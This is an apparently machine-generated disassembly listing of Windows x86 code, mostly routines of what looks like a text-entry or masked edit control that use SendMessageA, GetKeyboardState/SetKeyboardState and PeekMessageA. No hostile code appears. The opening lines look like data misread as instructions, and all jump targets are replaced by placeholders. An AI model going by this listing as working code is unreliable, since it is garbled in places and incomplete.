jae r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call [ eax + 0x100431c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
add [ eax ] cl
push ebx
jo r-xdata
inc ebx
push 0xef47261
push 0x6948776f
outsb
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ eax + 0x1004486 ] ah
outsd
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ eax + 0x6f ] edx
sub [ eax ] al
adc [ eax ] al
or eax 0x8ff0002
sbb al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_46495c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_464db4
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4473e4
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_465244
sub_4649ac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4474b4
mov eax esi
call sub_464db4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_4652b8
mov [ ebx ] 0x0
sub_464a04
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443718
mov eax ebx
call sub_464db4
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_464f8c
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_465244
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_464a84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464ae0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_464aec
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404828
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ae7
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax esi
call sub_4048dc
mov edx eax
mov eax ebx
call sub_441d40
mov eax ebx
call sub_465244
sub_464b00
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464b84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_464db4
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_464aec
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_465bc4
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441d64
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b8b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_465b7c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404480
sub_464b94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464c8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_464db4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4044c4
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441d94
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_465b7c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_463b00
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c91
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_464a84
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xec ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_464c98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464db4
test al al
jne r-xdata
mov eax ebx
call sub_431dc0
mov dx 0x2e
mov eax ebx
call sub_4657f8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_464ccc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464da6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_464db4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464dad
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
call sub_43b6dc
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_43b6dc
lea edx [ ebp - 0x4 ]
call sub_43b324
call sub_43b6dc
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_464f8c
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_464aec
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_4662b0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464a84
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_466348
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464a84
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_464fd4
sub_464dc4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464e79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_464aec
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_465bc4
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_404480
mov eax esi
call sub_4046e4
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_463890
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_463714
mov [ ebx + 0x22c ] al
mov eax esi
call sub_463798
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_465b7c
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_464a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e80
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404450
retn
sub_464e88
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_404828
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_464dc4
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_464f8c
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_431b54
mov eax ebx
call sub_464db4
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_464a84
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_448484
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_431b54
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_464fd4
sub_464f5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464db4
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_431b54
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_431b54
pop esi
pop ebx
retn
sub_464f8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_464fb0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_464fd4
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465234
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_464db4
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_464aec
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c81c
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_464aec
mov eax [ ebp - 0x218 ]
call sub_4046e4
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_464aec
mov eax [ ebp - 0x210 ]
call sub_4046e4
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_464fb0
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_464aec
mov eax [ ebp - 0x21c ]
call sub_4046e4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_464aec
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_464fb0
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46523b
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_404450
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4038bc
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_4651a2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4038bc
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_4038bc
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_465244
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_464db4
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_464f8c
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_464fd4
sub_465290
push ebx
mov ebx eax
mov eax ebx
call sub_431b98
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_464a84
xor edx edx
mov eax ebx
call sub_431bd0
sub_4652b8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46547d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465484
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_464f8c
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_4657f8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4656cc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_464fd4
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_465d98
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_448484
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_40460c
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402ea8
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402e78
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_404688
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_464fb0
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax esi
call sub_448484
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_464f8c
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_465678
sub_465490
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46566a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465671
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404450
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_464f8c
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4656b0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_464aec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464fb0
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_464aec
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464fd4
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_464fd4
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_464fb0
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_465678
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_465678
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_465678
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4656b0
jmp r-xdata
sub_465678
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_4656cc
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_463940
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_464fd4
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_4656cc
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_463940
test al al
jne r-xdata
inc ebx
sub_4656f4
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_463940
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4656cc
mov ebx eax
dec ebx
sub_465728
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_464f8c
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_464fd4
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_464fd4
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_464fb0
mov eax ebx
call sub_465244
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_464fb0
mov eax ebx
call sub_465244
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_4657f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_465904
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46590b
lea eax [ ebp - 0xc ]
call sub_40442c
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_464f8c
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_464aec
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_4662b0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_40493c
mov eax [ ebp - 0xc ]
call sub_4048dc
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_4656b0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_464f8c
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_464f8c
mov edx [ edi ]
dec edx
mov eax ebx
call sub_464fd4
mov edx [ edi ]
mov eax ebx
call sub_4656cc
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_464fd4
jmp r-xdata
sub_465914
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465997
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_464db4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_432318
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_465244
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_464aec
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_404480
mov edx esi
mov eax ebx
call sub_432318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46599e
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4659a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_465a25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_432354
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_464aec
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_404480
mov eax ebx
call sub_448788
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465a2c
lea eax [ ebp - 0xc ]
call sub_40442c
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_464f8c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4656cc
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_464fd4
sub_465a34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464db4
test al al
je r-xdata
mov eax ebx
call sub_431b98
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_465a6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464db4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4478f8
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
mov eax ebx
call sub_465244
sub_465aa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465b32
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_464aec
mov eax esi
call sub_464db4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465b39
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax esi
call sub_431b98
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xec ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_464fd4
mov eax esi
mov edx [ eax ]
call [ edx + 0xf0 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
sub_465b40
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
